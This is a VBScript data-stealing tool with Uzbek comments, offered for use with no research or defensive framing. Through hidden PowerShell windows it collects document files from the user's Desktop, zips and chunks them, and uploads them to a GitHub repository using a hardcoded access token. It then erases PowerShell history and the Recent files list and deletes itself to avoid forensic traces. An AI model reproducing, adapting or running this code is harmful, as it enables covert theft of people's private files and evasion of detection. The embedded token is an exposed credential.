' ================== ELITE STEALTH GITHUB UPLOADER & CLEANER ==================
Option Explicit

Dim fso, shell, desktopPath, tempPath, workDir, zipPath, vbsPath
Dim githubUser, repoName, token, computerName, fileNamePrefix

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' --- SOZLAMALAR ---
githubUser = "Freddymercuriy"
repoName = "BMI"
token = "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"

vbsPath = WScript.ScriptFullName
computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
desktopPath = shell.SpecialFolders("Desktop")
tempPath = fso.GetSpecialFolder(2).Path
workDir = tempPath & "\gh_chunks"
zipPath = tempPath & "\heavy_data.zip"
fileNamePrefix = computerName & "_" & Year(Now) & Month(Now) & Day(Now)

' 1. VAQTINCHALIK MUHITNI TAYYORLASH (Yashirin)
If fso.FolderExists(workDir) Then fso.DeleteFolder workDir, True
fso.CreateFolder(workDir)

' 2. ZIP VA 20MB BO'LAKLARGA BO'LISH (Butunlay yashirin)
Dim psZip
psZip = "powershell -NoP -w h -C "" " & _
    "$f = Get-ChildItem '" & desktopPath & "' -Include *.doc,*.docx,*.pdf,*.txt -Recurse -EA Si; " & _
    "if ($f) { " & _
    "  Compress-Archive -Path $f.FullName -DestinationPath '" & zipPath & "' -Force; " & _
    "  $s = [IO.File]::OpenRead('" & zipPath & "'); " & _
    "  $buffer = New-Object byte[] 20MB; " & _
    "  $i = 1; " & _
    "  while (($read = $s.Read($buffer, 0, $buffer.Length)) -gt 0) { " & _
    "    $path = '" & workDir & "\part_' + $i + '.dat'; " & _
    "    $fs = [IO.File]::Create($path); " & _
    "    $fs.Write($buffer, 0, $read); " & _
    "    $fs.Close(); " & _
    "    $i++; " & _
    "  } " & _
    "  $s.Close(); Remove-Item '" & zipPath & "'; Write-Output 'OK' " & _
    "}"""

' Jarayon tugashini kutamiz (oynasiz)
shell.Run psZip, 0, True

' 3. GITHUB API ORQALI YUKLASH (Yashirin navbat)
If fso.FolderExists(workDir) Then
    Dim folderObj, file, count, uploadPs
    Set folderObj = fso.GetFolder(workDir)
    count = 0

    For Each file In folderObj.Files
        count = count + 1
        
        ' API put so'rovi (TLS 1.2 va yashirin rejim)
        uploadPs = "powershell -NoP -w h -C "" " & _
                   "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
                   "$b = [Convert]::ToBase64String([IO.File]::ReadAllBytes('" & file.Path & "')); " & _
                   "$body = @{message='p" & count & "'; content=$b} | ConvertTo-Json; " & _
                   "$url = 'https://api.github.com/repos/" & githubUser & "/" & repoName & "/contents/" & fileNamePrefix & "_p" & count & ".dat'; " & _
                   "$headers = @{'Authorization'='token " & token & "'; 'Accept'='application/vnd.github.v3+json'; 'User-Agent'='PS'}; " & _
                   "Invoke-RestMethod -Uri $url -Method Put -Body $body -Headers $headers -ContentType 'application/json'"""
        
        shell.Run uploadPs, 0, True
        WScript.Sleep 1200 ' Tarmoq yuklamasini kamaytirish uchun kichik pauza
    Next
End If

' 4. IZLARNI TOZALASH (Anti-Forensics)
' Vaqtinchalik fayllarni o'chirish
If fso.FolderExists(workDir) Then fso.DeleteFolder workDir, True

' PowerShell tarixi va oxirgi fayllar ro'yxatini tozalash
Dim psCleanup
psCleanup = "powershell -NoP -w h -C "" " & _
            "Clear-History; " & _
            "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; " & _
            "del /f /q $env:APPDATA\Microsoft\Windows\Recent\*"""
shell.Run psCleanup, 0, True

' 5. SELF-DELETE (O'zini bildirmasdan o'chirish)
' CMD oynasi ko'rinmasligi uchun 0 parametri bilan ishga tushadi
shell.Run "cmd.exe /c timeout /t 3 >nul & del /f /q """ & vbsPath & """", 0, False

WScript.Quit